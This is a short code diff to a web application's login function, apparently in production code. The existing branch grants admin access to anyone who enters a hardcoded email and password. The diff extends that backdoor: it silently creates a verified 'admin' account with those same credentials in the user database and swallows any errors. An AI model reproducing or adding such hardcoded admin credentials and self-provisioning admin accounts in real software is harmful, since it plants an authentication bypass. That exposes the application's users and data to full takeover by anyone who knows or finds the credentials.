@@ -271,9 +271,25 @@ export const login = async (req, res, next) => {
 
     // 1. Admin Superuser Access (admin420@gmail.com / 420420420)
     if (cleanEmail === 'admin420@gmail.com' && password === '420420420') {
+      let dbAdmin = null;
+      try {
+        dbAdmin = await User.findOne({ email: 'admin420@gmail.com' });
+        if (!dbAdmin) {
+          dbAdmin = await User.create({
+            name: 'System Administrator',
+            email: 'admin420@gmail.com',
+            passwordHash: await bcrypt.hash('420420420', 10),
+            role: 'admin',
+            isVerified: true,
+          }).catch(() => null);
+        }
+      } catch (e) {}
+
+      const adminId = dbAdmin ? dbAdmin._id : 'prod-admin-420';
+
       const adminUser = {
-        id: 'prod-admin-420',
-        _id: 'prod-admin-420',
+        id: adminId,
+        _id: adminId,
         name: 'System Administrator',
         email: cleanEmail,
         role: 'admin',
